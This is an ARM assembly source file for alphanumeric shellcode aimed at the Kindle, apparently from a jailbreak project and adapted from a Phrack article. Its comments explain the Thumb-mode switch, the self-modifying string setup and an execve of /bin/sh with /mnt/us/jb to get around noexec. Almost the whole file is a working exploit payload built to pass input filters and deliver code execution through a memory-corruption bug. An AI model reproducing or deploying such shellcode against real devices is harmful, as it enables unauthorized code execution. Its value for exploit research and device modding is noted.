# Kindle Alphanumeric ARM Shellcode.
#
# Does an execve of /bin/sh /mnt/us/jb. execve arguments are needed to get
# around noexec on the Kindle.
#
# Based on the excellent shellcode developed by Yves Younan and Pieter
# Philippaerts in issue #66 of phrack. (http://phrack.org/issues/66/12.html)
#
# Code is similar to the example up to the cache flush. The original example was
# developed for arm/OABI, hence there are a few padding artifacts still in the
# shellcode from moving to arm/EABI for the Kindle. Cacheflush seemed to need
# more specific arguments as well, so an address in the correct code segment
# should be populated in the correct register. See man syscall for more details.
#
# If interested in understanding the details of this, try simulating it in QEMU.

.section .text
.global _start

_start:

    # Originally, the first instruction (a crafted RSBVS ending up as "bbbb")
    # was used as a small buffer we could overwrite with a known name. i.e., if
    # this code was staged in an address bar and overwritten a host named "a",
    # the instruction would become "a\0bb", which effectively becomes a NOP and
    # is still safe to execute after modification.
    .byte    0x62,0x62,0x62,0x62
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBPL    r3, r1, #56
    SUBMI    r3, pc, #48
    SUBPL    r3, pc, #48
    LDRPLB   r3, [r3, #-48]
    LDRMIB   r3, [r3, #-48]
    SUBMIS   r5, r3, #57
    SUBPLS   r5, r3, #57
    SUBMI    r7, SP, #48
    SUBMIS   r3, r3, #56
    SUBPL    r6, r3, r3, ROR #2
    SUBPL    r4, PC, r3, ROR #2
    STMPLFD  r7, {r0, r4, r5, r6, r8, lr}^
    SUBPL    r4, r3, r3, ROR #2
    SUBPL    r5, r4, #121
    SUBPL    r6, PC, r5, ROR #2
    SUBPL    r6, r6, r5, ROR #2
    SUBPL    r6, r6, r5, ROR #2
    SUBPL    r6, r6, r5, ROR #2
    SUBPL    r6, r6, r5, ROR #2
    SUBPL    r6, r6, r5, ROR #2
    SUBPL    r6, r6, r5, ROR #2
    SUBPL    r6, r6, r5, ROR #2
    STRPLB   r3, [r6, #-0x52]
    STRPLB   r3, [r6, #-0x53]
    STRPLB   r3, [r6, #-0x54]
    EORPLS   r3, r3, #56
    SUBPL    r7, r3, #57
    EORPLS   r5, r7, #80
    SUBMI    r5, r3, #54 
    EORMIS   r5, r3, #66
    EORPLS   r5, r5, #108
    STRPLB   r5, [r6, #-0x48]
    EORPLS   r5, r3, #86
    EORPLS   r5, r5, #65
    STRPLB   r5, [r6, #-0x46]
    STRPLB   r7, [r6, #-0x47]
    SUBPL    r3, r7, #120
    SUBPL    r3, r3, #120
    SUBPL    r3, r3, #120
    SUBPL    r6, r6, r3, ROR #2
    SUBPL    r6, r6, r3, ROR #2
    EORPLS   r5, r7, #97
    EORMIS   r5, r5, #65
    STRMIB   r5, [r6, #-0x71]
    EORMIS   r7, r4, #56
    SUBPL    r5, SP, #48
    LDMPLFA  r5!, {r0, r1, r2, r6, r8, lr}
    SUBPL    r7, r7, #56
    SUBPL    r5, r4, r4, ROR #2
    RSBPLS   r5, r5, #-268435452
    EORMIS   r5, r5, #48
    SUBMIS   r3, r5, #-268435452
    SUBPL    r5, r5, #52
    EORPLS   r7, r7, r5, ROR #12
    EORPLS   r7, r7, #0x32
    EORPLS   r7, r7, #0x30
    EORPLS   r5, r5, #48
    # SWI NR appears to be ignored on EABI. Operations left in for padding but
    # could potentially be removed for space savings.
    SWIMI    0x414141
    EORMIS   r5, r4, #56
    SUBPL    r6, pc, r1, ROR #2
    .byte    0x30,0x30,0x30,0x51

    # At this point, R0 should be a PC in our code segment.
    # R1 = 0xFFFFFFFF
    # R2 = 0x0
    # R3 = 0x30
    # R4 = 0x0
    # R5 = 0x38
    # R6 = 0x151
    # R7 = 0x000F0002

    .THUMB
    # We assume r2 is 0 before entering Thumb mode. First, we have to jump over 
    # our execve strings.
    MOV      r0, pc
    ADD      r0, #0x52
    SUB      r0, #0x35
    NEG      r6, r0
    NEG      r6, r6
    BX       r6

    # Placing the data to modify before the code to modify it makes offset
    # management less of a headache.
    .ascii   "0bin0sh0"
    # Extra byte at the end for padding. Could be optimized out.
    .ascii   "0mnt0us0jb00"

    # Point r0 back to the start of the execve strings.
    ADD      r0, #0x4D
    SUB      r0, #0x62
    MUL      r1, r2
    # Store the nulls first.
    ADD      r1, #0x7A
    SUB      r1, #0x73
    STRB     r2, [r0, r1]
    ADD      r1, #0x7A
    SUB      r1, #0x6F
    STRB     r2, [r0, r1]
    MUL      r1, r2
    # Move '/' to r2 and clear the index back to zero.
    ADD      r1, #97
    SUB      r1, #50
    NEG      r2, r1
    NEG      r2, r2
    MUL      r1, r4
    # Store the '/'
    STRB     r2, [r0, r1]
    ADD      r1, #0x7A
    SUB      r1, #0x76
    STRB     r2, [r0, r1]
    ADD      r1, #0x7A
    SUB      r1, #0x76
    STRB     r2, [r0, r1]
    ADD      r1, #0x7A
    SUB      r1, #0x76
    STRB     r2, [r0, r1]
    ADD      r1, #0x7A
    SUB      r1, #0x77
    STRB     r2, [r0, r1]
    # Setup execve syscall number in r7.
    MUL      r1, r4
    ADD      r1, #48
    SUB      r1, #49
    NEG      r7, r1
    MUL      r1, r4
    ADD      r1, #65
    SUB      r1, #54
    MUL      r7, r1
    # Start constructing r1
    MOV      r2, sp
    MUL      r1, r4
    # Store /bin/sh pointer to argv[0]
    STR      r0, [r2, r1]
    ADD      r1, #0x7A
    SUB      r1, #0x76
    ADD      r0, #0x7A
    SUB      r0, #0x72
    STR      r0, [r2, r1]
    ADD      r1, #0x7A
    SUB      r1, #0x76
    STR      r4, [r2, r1]
    # Move argv to r1.
    NEG      r1, r2
    NEG      r1, r1
    # Set r0 to address of "/bin/sh"
    ADD      r0, #0x72
    SUB      r0, #0x7A
    # Clear r2
    MUL      r2, r4
    # We're ready, execve.
    .byte    0x30,0x30
